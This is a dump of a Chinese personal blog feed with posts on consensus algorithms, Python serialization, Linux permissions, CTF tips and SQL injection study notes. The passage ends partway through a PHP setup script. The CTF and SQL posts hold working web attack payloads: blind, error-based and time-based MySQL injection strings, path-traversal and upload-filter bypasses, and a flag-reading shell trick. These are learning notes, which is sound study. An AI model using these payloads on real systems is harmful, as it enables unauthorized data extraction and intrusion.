1.2.2分布式系统需要解决的一个问题重要问题：如何在存在不可靠的（可控故障），甚至是不可信的（拜占庭结点）结点直接建立共识机制来协调分布式系统的正常工作。不可靠结点：结点因物理故障等原因消息传递或者说是节点间通讯延迟或者中断不可信结点：也即拜占庭结点，结点会自发产生不可预见性的行为，其行为异常可以不符合协议的约定（针对这种异常，比较容易通过检测机制察觉出来）。但是也有一些符合协议约定内容的，但是信息是编造的也就是我们平时所说的hacking行为，这种结点需要有特定的算法来达成共识，每个结点具有正确的一致性。 1.3.0 达成共识需要满足的三个条件：一致性：所有好的结点（好结点区别于不可靠和不可信结点，是可以按照我们期望的行为去工作的结点）决策值必定相同。可终止性：所有的好结点在有限的时间内结束决策过程有效性：选择出的值必须是某个节点的输入值1.4.0 需要明白的一些原理1.4.1 FLP 不可能原理：在网络可靠，存在节点失效（即便只有一个）的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性算法。1.4.2 CAP原理：分布式计算系统不可能同时确保一致性（Consistency）、可用性（Availablity）和分区容忍性（Partition），设计中往往需要弱化对某个特性的保证。 一致性（Consistency）：任何操作应该都是原子的，发生在后面的事件能看到前面事件发生导致的结果，注意这里指的是强一致性； 可用性（Availablity）：在有限时间内，任何非失败节点都能应答请求； 分区容忍性（Partition）：网络可能发生分区，即节点之间的通信不可保障。 1.4.3 目前主要有几大类共识机制：Pow、Pos、DPos、Pool、PBFT1.4.4 有效性任何输入有效性：最终的决策值必须是某个节点的输入值正确输入有效性：决策值必须是某个好节点的输入值全部相同有效性：如果所有好结点起始具有相同的输入值v,则决策值也必须是v 1.5.0 比特币，以太坊和超级账本(hyperledger) 区块链的第一代——比特币，比特币是日本中本聪之作，它是区块链的骇世之作，也是目前最为成 熟的的区块链应用之一。比特币白皮书 区块链的第二代——以太坊,以太坊的诞生一定程度上是为了解决比特币的拓展性不足的问题。以太坊白皮书 区块链的第三代——超级账本，超级账本（hyperledger）白皮书 衍生阅读1：以太坊和hyperledger的比对衍生阅读2: thinking in blockchain 1.6.0 10步建立自己的区块链（参考IBM blockchain1.pdf） 区块链技术我的应用是否真的需要 在我的网络应用中交易行为是否面临这挑战，有哪些挑战 思考区块链会如何帮助我们应对这些挑战 Choosing an Appropriate Use Case 建立一个明确的区块链网络的宏观目标或者规划 思考区块链的建立始末相关的依赖性问题 选择一个现如今提供API的区块链项目平台，例如以太坊和超级账本等等 逐步完善和发展你的区块链代码 对你的产品进行测试 加入超级账本的交流社区，去里面交流技术，为区块链社区的发展贡献自己的一份力 1.7.0 核心算法笔记 两阶段协议与分布式容错算法Paxos两阶段协议12345678910阶段1：客户端像所有的服务器请求锁阶段2：if 如果客户端获得了所有服务的锁 then 该客户端以可靠的方式向每个服务器发送命令，与此同时释锁else 该客户端释放已经获得的锁 该客户端等待一段时间，重新进入阶段1end if 朴素的基于票的协议票：一种弱化的锁，一个服务器可以发布多个票，即使之前的票还没有释放。而锁的话服务器只能等上一个锁释放后才可以发放下一个。客户端通过票来取得与服务器的联络凭据。同时票具有时效性，也即服务器只认识最新发布的票。1234567891011121314151617阶段1：客户端向所有服务器请求一张票阶段2：if 收到超过半数的服务器回复then 客户端将获得票与命令一起发送给每个服务器 服务器检查票的状态，如果票仍然有效（也即最新），则储存命令并给该客户一个积极反馈（该反馈信息作为服务器可执行的通知）else 客户端等待，重新进入阶段1end if阶段3：if 客户端从过半数的服务处得到了正反馈then 客户端告诉所有的服务器执行之前的存储的命令else 客户端等待，然后重新进入阶段1end if Paxos算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354初始化阶段：客户端（提案者）：c 待执行命令c(commmend)t=0 当前尝试的票号t服务器（接受者）T_max=0 当前发布的最大票号代码C_Memory 当前存储的命令T_cmemory 用来存储命令c的票阶段1：客户端：t=t+1向所有的服务器发送消息，请求得到编号为t的票服务器：if t &gt; T_max then T_max=t 回复ok(T_cmemory,C_Memeory)end if阶段2：客户端：if 过半数的服务器回复ok then 选择T_cmemory值最大的ok携带的信息流，也即(T_cmemory,C_Memeory) if T_cmemory&gt;0 then c=C end if 向这些回复了ok的服务器发送提案：propose(t,c)end if服务器：if t = T_max then c=c T_cmemory=t 回复：sucecssend if阶段3：客户端：if 过半数的服务器回复success then 向每个服务器发送信息：excute(c)end if 随机共识机制(bool类型的决策)因为之前有提到LFP不可能存在一个确定的算法解决一致性问题。所以在公式的达成上面我们的算法一定是不确定的，这就是随机共识机制中“随机”的精妙之处。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748vi=0 or 1round=1decided=false在分布式系统中广播myvalue(vi,round)while true do 1.提案 持续等待，直到收到过半数当前轮（round）的myvalue消息 if 所有的消息包含相同的值v then 广播提议propose(v,round) else 广播propose(本机存储的vi,round) end if if decided then 广播myvalue(vi，round+1) 确定决策之为vi,并且终止算法 end if 2.调整 持续等待，直到收到超过半数的当前轮（round）的propose消息 if 所有消息的提案（propose）同样的值v then vi=v decided=true else if 至少一个提案包含v then vi=v else 随机等可能的选择本地vi的决策值 end if round=round+1 广播myalue(vi,round)end while针对上述算法的改进，在随机选择本地决策值的部分可以采用共享硬币的算法加速决策效率，减少轮数，具体如下：以1/n的概率使得本地硬币（或者说是决策）c_x=0,否则c_x=1结点x广播mycoin（c_x）等待n-f个硬币的到来，并将他们存储在本地的硬币集合Cx中广播myset(Cx)等待n-f个硬币集合（n为结点数，f为最多故障结点数）if 在这些集合中，至少有一个硬币为0 then return 0else return 1end if 同步,异步模式下的拜占庭协定同步模式下国王算法（King algorithm）（容忍范围：f &lt; n/3 ）1234567891011121314151617181920212223x=本结点的输入值for 从第一轮到第f+1个阶段 do 第一轮 广播value(x) 第二轮 if 接收到了value（y）至少n-f次 then 广播propose(y) end if if 接收到propose(z)至少f次 then x=z end if 第三轮： 设结点vi是预先设定好的第i阶段的国王 国王vi广播它的当前值w if 接收到propose(x)的次数严格少于n-f then x=w end if end for 异步模式下的拜占庭协定算法（bool型,容忍范围f&lt; n/10）12345678910111213141516171819xi=(0|1)r =1 decided=false广播propose(xi,r)repeat 持续等待，直到接收到n-f条当前轮r的propose 消息， if 至少n/2+3f+1 propose 消息包含相同的值x then xi=x,decided=true else if 至少n/2+f+1 propose 消息包含同样的值x then xi=x else 随机选择xi,服从等概率 end if r=r+1 广播propose(xi，r)until decided(第8行)decision =xi 带认证的拜占庭协定同步模式下使用认证的拜占庭协定（bool型，容忍范围：f&lt;n）123456789101112131415161718主节点下:if 输入值为1 then 广播value(1)p 将1设为决策值并终止运行else 将0设为决策值并终止运行end if其他所有节点上v上运行的代码：for all rounds i 属于1，2，......，f+1 do S是所有value(1)u的消息集合 if |S|&gt;=i 并且value(1)p 属于S then 广播S与&#123;value(1)v&#125; 将1设为决策值并且终止运行 end ifend for将0设置为决策值 Zyzzyva算法（可以支持非bool型）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071在时刻t,客户端u希望执行命令c客户u将请求R=request(c,t)发送到主节点p主节点p将c增加到它的本地历史中，hp=(hp,c)主节点p向所有的副本发送OR=orderedrequest(hp,c,r)_ppoint1:每个副本r将命令c增加到它的本地历史中，hr=(hr,c),并且检查hr=hp是否成立每个副本r执行命令ck,并得到运行结果a每个副本r向客户端发送Response(a，OR)_r客户端u将接收到的Response(a，OR)_r消息存放到结合S中客户端检查所有的历史hr是否一致if |S|=3f+1 then 客户端认为命令c以及完成end if if 2f+1&lt;=|S|&lt;3f+1 then 客户端u向所有的副本发送Commit(S)_u 每个副本r向u回复LocalCommit(S)_r 客户端u至少收集到2f+1条LocalCommit(S)_r消息，于是认为命令c已经完成end ifif |S|&lt;2f+1 then 客户端u向所有的副本发送原始的R=Requst(c,t)_u消息 每个副本r向主节点发送一条ConfirmRequest(R)_r if 主节点p回复消息OR then 副本r将OR转发给所有的其他副本 goto point1 else 副本r广播IHatePrimary_r以启动视图改变 end if end if视图改变协定所有副本持续接收IHatatePrimary_r消息，并将它们存放于集合H中if 某个副本接收到了|H|&gt;f消息或者接收到了一条有效的ViewChange消息 then 副本广播ViewChange(Hr,hr,Sr)_r 副本停止参与当前的视图格局 副本切换到下一个主节点p=p+1end if执行视图改变新的主结点p将收集到的ViewChange(Hr,hr,Sr)_r消息存入集合Cif 新的主节点p接收到|C|&gt;=2f+1消息 then 新的主节点p向所有副本发送NewView(C)_p消息end ifif 副本r接收到一条NewView(C)_p消息 then 副本r恢复新的历史h_new： C=包含NewView(C)_p中2f+1ViewChange(Hr,hr,Sr)_r条消息的集合 R=C中的副本 S_l=C中的汇报的最近提交证书 h_new=S_l中包含的历史h_l k=l+1,下一个序列号 while 命令c_k 存在于C do if c_k被至少f+1个副本汇报 then 从R中删除哪些不支持c_k的副本 h_new=(h_new,c_k) end if k=k+1 end while return h_new 副本r向所有的副本广播ViewConfirm(h_new)_r if 副本接收到2f+1 ViewConfirm(h_new)_r消息 then 副本开始采用hr=h_new作为新的视图历史 副本r开始参与新的视图end if]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python序列化的疑惑]]></title>
    <url>%2F2018%2F02%2F25%2Fpython%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%96%91%E6%83%91%2F</url>
    <content type="text"><![CDATA[pickle 与 dill谈及对象的序列化，pickle与dill也许是用得最为频繁的两个库了，dill可以说是pickle的进化版，它所支持的对象类型要更多，但是仍旧还有一些局限性。 pickledill对象序列化是一种把存储于内存中的数据以二进制（序列化）的形式保存到磁盘中，方便下次调用的同时释放内存压力。而以上过程的逆过程就是反序列化。python是一门面向对象的编程语言，有一句话在python里面很哲学那就是“万物皆对象”。所以拥有了类似的将python的对象序列化存储的工具，无疑将会给编程带来很大的方便。 是的你没有理解错，就是连函数和class类型的对象也是可以被序列化的，也就是说，当你从磁盘使用load或者loads函数重新调用的时候会保留你实例化的python对象，并且该对象的方法也同样是可以调用的。那么基于这个原因，我们只需要使用短短两行代码就实现了这里面所说的所有序列化方法，就和你之前没有序列化时一摸一样。这样的底层封装思想可以给上层的程序员专注于实现应用本身而不是太多的在意轮子的制造。这或许就是python的简易，简洁的哲学吧。 同样的，对于一些特定的库，例如sklearn机器学习的库，本身就会有自己的一些序列化函数，例如“joblib”,这样的例子还有很多，他们的核心思想都是差不多的，特定的序列化函数（集成在一些大型库的内部）对于它要处理的数据类型和对象结构具有针对性，却不一定对其他的库有用。 好了说了这么多，来两个列子吧，这是最近在用scapy以及一些科学分析工具来做流量分析时候碰到的问题，所以这些感悟重新对序列化进行的一些反思。 12345678from scapy.all import rdpcapimport dillprint("hello")ini_data=rdpcap("test.pcapng")dill.dump(ini_data, open("游戏", "wb"))date=dill.load(open("游戏","rb"))print(date[1].show()) 首先，这里用pickle 是会报错的，具体原因笔者才疏，还没有很明白原因所在，报错中有“lambda”无名函数的关键字，然而笔者跟进到pickle库源码类中却没有发现“lambda”的函数所在，望以后能够渐渐弄明白。 同样笔者也看到官方文档中解释说在“functions defined at the top level of a module (using def, not lambda)”，笔者一知半解就去故意构造了一个类，其中使用了lambda来生成一个列表，发现这里是不会报错的。代码如下：12345678910111213141516171819202122import pickleimport mathclass pickle_hello(): def __init__(self): self.name="daming" self.sex='boy' self.number=1.456468 def print_name(self): print("hello",name) def floor(self): print(math.floor(self.number)) lis=filter(lambda x:x+1,[x for x in range(1,10)]) print(list(lis)[::-1]) obj1=pickle_hello()pickle.dump(obj1,open("t1","wb"))obj2=pickle.load(open("t1","rb"))print(obj2.floor()) 先把问题记录在这，日后顿悟再回来补充……]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux权限]]></title>
    <url>%2F2018%2F02%2F25%2FLinux%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[基本权限以及用户，用户组 execute(1),write(2),read(4) 拥有着，用户组（以及有效用户组的概念），其他人的概念，以及对应的权限显示格式“[-/d]xxx-xxx-xxx-:表示的是文件d(directory):表示的是目录 权限三剑客：chown,chgrp,chmod(u,o,g,a;w,r,x;+,-,=)，umask(修改新建文件的默认权限) 用户信息存放地：/etc/passwd 另外：密码md5存放地：/etc/shadow用户组的信息存放：/etc/groupsGID,UID的标识符 /etc/passwd的文件结构（按字段进行标号）： 账号名称 密码（现已保存在shadow文件中，该字段已经没有意义） UID GID 用户指纹信息（finger） 用户主文件夹 默认shell环境 /etc/shadow文件结构（按字段标号） 账号名称 密码(md5加密) 最近更改时间 与最近更改时间相比密码不能更改的时间 密码需要重新更改的天数 在密码需要更改时提前警告的天数 过期宽限时间 账号失效时间 目前没有意义，保留字段 /etc/group的文件结构 用户组名称 用户组密码 GID 该用户组的所有用户成员 常用的查看命令：whoami(查看当前登陆用户),who(类似于w以及单独使用的finger),groups(所属用户组),finger(查看用户指纹信息)，id(查看用户序号信息，uid,有效用户组gid,所有所属用户组gid） 123#查看所有用户cut -d : -f 1 /etc/passwdcat /etc/passwd |awk -F \: &apos;&#123;print $1&#125;&apos;#其他字段的查看依次类推 常用操作命令：useradd，userdel，usermod,,finger,chfn(修改finger),passwd(以及chage),id,chsh(更改默认shell环境);groupadd,groupmod,groupdel,groupwd(用户组管理员功能) 常用的操作对应的底层文件及其内容 指纹信息描述字段，也可以理解为账户备注：~/.plan(用户组文件夹的隐藏文件) useradd的参考文件：/etc/default/useradd UID/GID以及相关参数： /etc/login.defs 主文件夹参考目录： /etc/skel/* 文件隐藏权限 在rwx三种权限之外还有着一些隐藏的权限，例如文件只允许追加，不能被删除和删除，两个命令：lsattr(显示隐藏属性)，chattr(修改隐藏属性，常用的有-i(文件锁定),-a(文件只能追加)) 文件的特殊权限 文件的特殊权限主要有三种：SUID,SGID,SBIT。在ls命令列出文件的相关权限后，有时候会在拥有者或者用户组字段出现”s”的标识符，这个s就是指SUID,SGID权限（二者的不同在于s出现的字段，当出现在用户字段，那么就是SUID,出现在用户组字段就是SGID),当在其他人的权限字段出现”t”的时候，就表示该目录具有SBIT的特殊权限。 SUID:拥有SUID权限的执行者在执行该二进制文件的时候临时具有所有者的权限要求：仅仅正对二进制文件有效执行者需要对该程序具有x的可执行权限SUID权限仅在该程序执行过程中有效 SGID:拥有SGID权限文件的执行者在执行该二进制程序的时候具有用户组的权限要求:仅仅正对二进制文件有效执行者需要对该程序具有x的可执行权限SUID权限仅在该程序执行过程中有效 SBIT:用户在该目录下创建文件时只有自己与root才具有权力删除该文件夹要求:只对目录有效，SBIT只对目录可见，一般文件不具有这个权限用户需要对这个目录具有w,x的权限 SUID/SGID/SBIT对应的数字: SUID(4),SGID(2),SBIT(1) 权限的设置同样是使用chmod命令，特殊权限的赋予有多种方式，如果使用数字权限赋予需要在最前面，如果使用（u,g,o,a）追加需要加在对应的位置:u+s/g+s以及o+t ACL个性化权限 区别于统一化的权限设置，例如，针对三种身份的权限设定，ACL(acecess control list)对单一的目录进行个性化的权限定制，定制的对象可以是单个用户，也可以是用户组。 setfacl与getfacl命令的使用 SELinux(Security-Enhanced Linux)linux下的用户身份转换 切换用户的身份有su和sudo两种方式 su可以进行任意用户的切换(su -l )，但是必须需要知道所要切换到的用户的密码，而sudo当然也可以切换到任意用户(sudo -u),但是切换的对象需要记载在配置文件里面，只不过sudo不需要知道将要切换的用户密码，只需要知道自己的密码就ok。而sudo的管理也还是比较方便的，只需要编写配置文件/etc/sudoers就可以了。 visudo方便的设置/etc/sudoers，/etc/sudoers文件下的字段含义： 用户账号 允许的登陆者来源主机 可以登陆到的主机即可以切换到身份 切换用户后可以执行的命令(多半是出于安全考虑)]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF]]></title>
    <url>%2F2018%2F01%2F25%2FCTF%2F</url>
    <content type="text"><![CDATA[这是一篇不系统的，比较杂碎的ctf涉及的小技巧汇总，灵光一现的记录自己在做题或者看writeup中的一些小细节，正所谓“不积细流，无以成江海”。 1.zip —symble命令进行压缩后的文件是可以跨宿主机传递link信息的，然后解压成的文件会在新的宿主机里面进行新的连接，从而在php中的命令执行函数，如shell_exec（）解压命令可以造成宿主机信息泄露.例子传送门 2.PHP的序列化与反序列化php反序列化成立的条件： 一个用户可空的反序列点 这个反序列点的过滤是不完全的，也即hacker可以去绕过过滤传入一个对象。 在程序中存在有一个或多个可以利用的魔术方法：__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()，__invoke()， __set_state()， __clone() 和 __debugInfo() ,在这里我们主要关注点在于__wakeup(),destruct(),__construst(),其他魔术方法的利用方式的发掘相对来说还是比较困难的。 源码审计发现一条行之有效的链。 原理常用魔术方法解析题目1:cookie腐朽序列化题目2:session的序列化modify与eval执行拓展阅读:session与cookie的关系以及作用机理其中有一点需要明确：cookie作为client端的认证。session作为server端的认证，二者的关系：cookie作为server端的session序列化的文件名，而文件内容就是session的值，这样就是二者一一对应的关系。session在server端的保存地址：C:\WINDOWS\Temp(windows); /tmp(linux)cookie在client端的保存地：不同的操作系统不同的浏览器的保存位点一般不一样。一句话总结：Basicly, all session variables stored as a file with format sess_(PHPSESSID) in folder session.save_path and the content stored as serialized string 3.PHP中的$_REQUEST传参是具有默认顺序的，使用$_REQUEST作为检测点往往会造成重写绕过。以下为php官方文档的user note中的一段原话：Note you should use $_GET, $_POST and $_COOKIE seperately if you use same name or your not sure.Because there are “overwrite” problems with $_REQUEST :123456Example: $_GET['foo'] is a 'hello' string //from user input$_POST['foo'] is a 'world' string //from user input #Then the $_REQUEST['foo'] would be a 'world' string. The value 'hello' is overwritten.#So don't use $_REQUEST to monitor user inputs. 例如：ctf一道sql注入题4.一个tip在bash shell 文件中将执行的输出写入到本文件，在ctf中限制了读取文件范围的时候，可以直接将输出结果以追加的方式重定向到可执行脚本中。1234#!/bin/shcat /flag &gt;&gt; "./$&#123;0##*/&#125;";#格式： command &gt;&gt; "./$&#123;0##*/&#125;" ctf中一道使用例题5.本地文件包含中我们可以做的一些信息提取或者提权6.尝试不同的http请求方法7.关于源码泄露例题1：git gud 例题2：.git实现备份还原 还有一中比较常见的源码泄露：vim源码泄露可以通过在文件名后追加~或者.swp就可以获取，这常在web类的url获取源码题中，有时获取到的问价是混乱的，我们可以使用linux下的命令回复文件： 1vim -r [混乱的文件名] 概括了一些java泄露源码的思路 8.url编码绕过一道php,执行ctf题 9.路径遍历中如果过滤函数为str_replace(&quot;../&quot;,&quot;./&quot;,$(变量))，可以使用.../绕过，对于../被删除的filter,使用....//思想绕过 BookDir10. 一次很典型的sql注入的解题思路 11. php随机数预测crack12.php获取信息的$_SERVER数组 $_SERVER[‘HTTP_CLIENT_IP’],$_SERVER[‘HTTP_X_FORWARDED_FOR’]里面的用户ip是不可靠的（他们来自于用户的http请求头），只有$_SERVER[‘REMOTE_ADDR’]是基于tcp/ip协议底层的ip地址。 13.select `version()` ，可以用来过空格和正则，特殊情况下还可以将其做注释符用这是一道非常厉害的ctf题 14.常用的命令执行函数：14.1 exec,system,popen,shell_exec(与反撇号`执行的效果差不多)，passthru,proc_open，eval`(这个不是系统命令执行，而实php代码执行)15. 在绕过上传漏洞出现较多的文件后缀过滤的情况，可以尝试先上传.htaccess 修改绕过规则，然后再上传shell.16. 在一些支持file,XHR跨站请求的浏览器中，我们可以使用这个协议来获得文件内容。 这个点又常常在html-&gt;pdf的提交类web站点实现利用。例题：NoNameCon CTF Quals 2018 / Web / bank相关知识点 17.关于referer请求头18.XEE漏洞19.path、dir、file、pag、page、archive、p、eng这些关键字眼可能暗示存在文件包含。20. system(),eval(),两个函数是可以对open_basedir绕过的两个函数，这函数不受open_basedir的限制。例子 21.SHA1 Collision attackhash1PDF重名hash攻击于去年实现 22.在一些设计浏览器的ctf中,有个网址可以查看各个浏览器以及各个版本对一些html的支持情况，从而发现一些端倪。caniuse23.SSTI白皮书]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python变量作用域的思考]]></title>
    <url>%2F2017%2F12%2F12%2Fpython%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[最近学计算机数学，当中有数论的相关应用，很多算法设计涉及了python中的变量作用域，举出其中的一个例子，我就是慢慢了解python变量作用域机制的。 这段代码基本涉及了大部分的作用域知识(python3.6)1234567891011121314151617181920212223242526272829303132333435363738def test_variable_effect(): a=1 print("iner a=",a) def local_variable(): a=4 print("run local_variable with a equaling to 4") local_variable() print("iner a=",a) def change_ext_fun_variable(): nonlocal a a=5 print("run chanfe_ext_fun_variable with a equaling to 5") change_ext_fun_variable() print("iner a=",a) def change_global(): global a a=20 print("run change_global with a equaling to 20") change_global() print("iner a=",a)a=10print("global a=",a)test_variable_effect()print("global a=",a)输出为：global a= 10iner a= 1run local_variable with a equaling to 4iner a= 1run chanfe_ext_fun_variable with a equaling to 5iner a= 5run change_global with a equaling to 20iner a= 5global a= 20 值得注意的是类似列表这样的可变参数，和上述的作用域有不同之处，具体代码如下，是一个实现整数分解素数化，也就是算数基本定理。这是一次偶然的机会，由于疏忽考虑了子函数对存在的列表的作用范围，发现代码竟然出奇的按照了我的思路去运行，也就有了对列表这类可变参数的作用范围的思考。 1234567891011121314151617181920212223242526272829def factorization(loop_key): ''' 内嵌函数实现静态变量的功效 ''' global rep_divisor rep_divisor=[] def loop_mod(loop_key): num=[] for i in range(1,loop_key//2+1): if loop_key%i==0: num.append(i) if num: max_num=max(num) rep_divisor.append(loop_key/max_num) loop_key=max_num loop_mod(loop_key)#递归 else: rep_divisor.append(loop_key) divisor=list(set(rep_divisor)) for key in divisor: print(key,"num:",rep_divisor.count(key)) loop_mod(loop_key)#函数内部自调用if __name__=="__main__": key=34560#需要运算的数 factorization(key) 更为直观的一段代码体现，123456789def loop_append(): for i in range(1,10): num.append(i)num=[]loop_append()print(num)#输出为：[1, 2, 3, 4, 5, 6, 7, 8, 9] 对于字典类型是否是一样的呢?12345678910def loop_add(): for i in range(1,10): num["key&#123;&#125;".format(i)]=inum=&#123;&#125;loop_add()print(num)#输出为：# &#123;'key1': 1, 'key2': 2, 'key3': 3, 'key4': 4, 'key5': 5, 'key6': 6, 'key7': 7, 'key8': 8, 'key9': 9&#125; 由上可知我的猜想是正确的。所以python的变量作用范围问题是个有趣的东东。]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[machine-learning]]></title>
    <url>%2F2017%2F12%2F01%2Fmachine-learning%2F</url>
    <content type="text"><![CDATA[近来学习了NG的machine—learning的课，上面使用matlab来实现的，但是基于对python的热爱以及本身python在数据处理上面的优势，所以打算近来把之前学到的机器学习的相关专题python来实现，这只是个序言，列举了一些常用的数据下载地址，和整个项目流程的框架。 项目地址传送门 监督学习：1. 线性回归2. 逻辑回归3. 支持向量机（svm）3. 神经网络（正向传播）4. 神经网络（反向传播） 非监督学习6. PCA7.K-MEANS8.异常检测算法（Anomaly Detection System）9.推荐系统算法(Recommender Systems) 章节将追随上课进度持续更新，欢迎一起捣鼓 可以下载数据的网址UCI数据DATA知乎总结1知乎总结2]]></content>
      <categories>
        <category>machine-learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL捣鼓]]></title>
    <url>%2F2017%2F11%2F23%2FSQL%E6%8D%A3%E9%BC%93%2F</url>
    <content type="text"><![CDATA[以此篇文章，记录我sql注入学习的路程 由于这是基于mysql的数据库来学习，所以把一些参考用到的资料摆在下面，另外这里没有包含混淆和绕过的技巧，只是说明了sql注入的原理 1.核心指导方针：这是大致上的注入思路，后面只不过是对这些过程的具体实现 猜数据库 select schema_name from information_schema.schemata 猜某库的数据表 select table_name from information_schema.tables where table_schema=&#39;xxxxx&#39; 猜某表的所有列 Select column_name from information_schema.columns where table_name=&#39;xxxxx&#39; 获取某列的内容 Select * from xxx 查询用户的权限 SELECT file_priv FROM mysql.user WHERE user = &#39;xxx&#39;; 其中：information_schema本身是一个数据库保存了数据库里面的数据库，表单，表单列的相关信息，schemata表是记录各个数据库的名字，tables记录的是表名字的信息，而columns就可以依次类推其内容为列名。 2. some detials: 2.1 三种闭合方式:();’’;””; 2.2 %20(空格),%27（单引号），%22(双引号)，%0A（=），%3E（&gt;）,3C(&lt;)，%23（#） 2.3 order by 用来对列的判断，超出表中的列就会报错（其实order By 的语句就是对表中的数据进行按列排序，按照指定列进行排序，有升序（默认/ASC），降序（DESC）以及乱序（rand（））） 2.4 union 联合查询语句需要select前后查询语句的列数相同，这就是为要用order by进行表单列的爆破，然后在payload中我们会经常看到如下语句的原因 2.5 @@hostname：用来看server机的用户名 2.6 uuid()函数用来查看服务器mac地址 2.7 @@datadir是mysql的文件地址 1-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata; 之前的都是一些基础和比较琐碎的细节，下来是盲注 3.盲注盲注的分类（bool，报错，延时）：3.1 bool型（就是运用逻辑链接进行一些对单个值逐个猜解的操作）注意盲注中比较快速的猜解是采用二分法，即%3E去判断字符的范围1234left(database(),1)&gt;’ s’ //核心语法?id=1%27and%20length(database())=8%23 //猜数据库长度?id=1%27and%20left(database(),1)%3E%27a%27--//逐个猜数据库名 database()显示当前数据库名称，类似的还schema（）， left(a,b)从左侧截取 a 的前 b 位 123456789101112ascii(substr((select table_name from information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 //核心语法//一下是以猜解表为例，其实这个方法也是可以运用到猜解列和数据库中?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))%3E80-- //猜解指定数据库中的表，第一个字符（逐个猜解）?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),2,1))%3E80-- //猜解第二个字符，后面依次类推?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1),1,1))%3E80-- //猜解第二个表，从第一个字段依次猜解 substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度 Ascii()将某个字符转换为 ascii 值 12ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位 Ord()函数同 ascii()， 将字符转为 ascll 值 12345678910select * from users where id=1 and 1=(select 1 from information_schema.tableswhere table_schema=&apos;security&apos; and table_name regexp &apos;^us[a-z]&apos; limit 0,1) //核心语法?id=1%27%20and%201=(select%201%20from%20information_schema.tables%20where%20table_schema=%27users%27%20and%20table_name%20regexp%20%27^us[a-z]%27%20limit%200,1)-- //猜解在users数据库中以us开头的表单是否存在，类似实现逐个字符的遍历?id=1%27%20and%201=(select%201%20from%20information_schema.columns%20where%20table_name=%27users%27%20and%20column_name%20regexp%20%27^us[a-z]%27%20limit%200,1)-- //猜解在user以us开头的数据表中是否存在us开头的列，依次类推 regexp为正则关键字，注意”select 1”的使用会使得我们匹配成功的话以bool型的数据返回，那么整个句子就是正确的。而其后面的”limit 0，1“是限定我们select返回的数据长度（如若不限定，那么我们得到的反馈有可能会是很多个1，而不是一个，因为匹配我们正则表达式的表可能不只一个），那么只要我们逐个字符的把表给遍历出来，特别注意这里的表是可以被全部遍历出来的，因为我们是在table_name下面对表进行遍历。28（4） 3.2 报错型顾名思义，就是存在错误回显的情况下，我们可以构造逻辑或者语法错误来使得sql返回一个异常，或者利用bug来直接回显我们的错误信息。 网上的教程比叫多，以下链接值得参考：盲注测试高级技能盲注原理讲解 12345678910111213141516select count(*) from information_schema.tables group by concat([sql],floor(rand(0)*2)) &apos;&apos;&apos;这个基于报错的语句是可以直接回显我们需要的东西的，只要在[sql]处插入你想要注入查询的语句就可 例如：select username from test limit 0,1； user（），version（），database（），......&apos;&apos;&apos;//如果禁用rand可以更改用户变量实现同样的目的select min(@a:=1) from information_schema.tables group by concat([sql],floor(@a:=(@a+1)%2));extractvalue(1,concat(0x7e,([sql]),0x7e))updatexml(1,concat(0x7e,([sql]),0x7e),1)// 上述的语句是基于两个解析xml的函数报错select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//重复查询漏洞，貌似不可以把version（）改成其他函数，亲自实验过 以上注入语句是可以嵌套使用的，这样的话，报错型盲注就和一般直接返回查询结果的注入没啥区别了，如下：123select min(@a:=1) from information_schema.tables group by concat((select group_concat(schema_name) from information_schema.schemata),&apos;-----&apos;,floor(@a:=(@a+1)%2));//更多变形可以自行拓展，但需要注意，这里concat连接的字段必须是一行，所以需要用group_concat或者其他连接函数将它以一行返回，但是注意concat连接的字符如果过长则会返回正常的表格。 测试在5.7版本以上的mqsql书中介绍的bigint错误不会回显出我们查询的字段 3.3 延时注入两种：benchmark，sleep 123456789101112If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))//这个类型的单字节猜解比较可取select sleep(find_in_set(mid(@@version, 1, 1), &apos;0,1,2,3,4,5,6,7,8,9,.&apos;));//注意在这里是可以一次把字符基于时间延时给遍历出来，但是却因为网速和cpu运行差异，使得我们的猜解不那么准确UNION SELECT IF(SUBSTRING([sql],1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’ ,’ by 5 seconds’ )),null) FROM (select database() as current) as tb1; BENCHMARK(count,expr)用于测试函数的性能， 参数一为次数， 二为要执行的表达式据说benchmark会占用比较多的内存。所以使用的时候需要视情况而定，尽可能少用吧。 4.具体的实验环境搭建（windows10,wampserver3.1.0(php5.6,apache2.4,mysql5.7),回环网络地址127.0.0.1)，接着撸代码。测试数据库生成脚本12345678910111213141516171819202122232425262728293031&lt;?php$con = mysql_connect("localhost","root","wearefamily");if (!$con) &#123; die('Could not connect: ' . mysql_error()); &#125;# 创建数据库if (mysql_query("CREATE 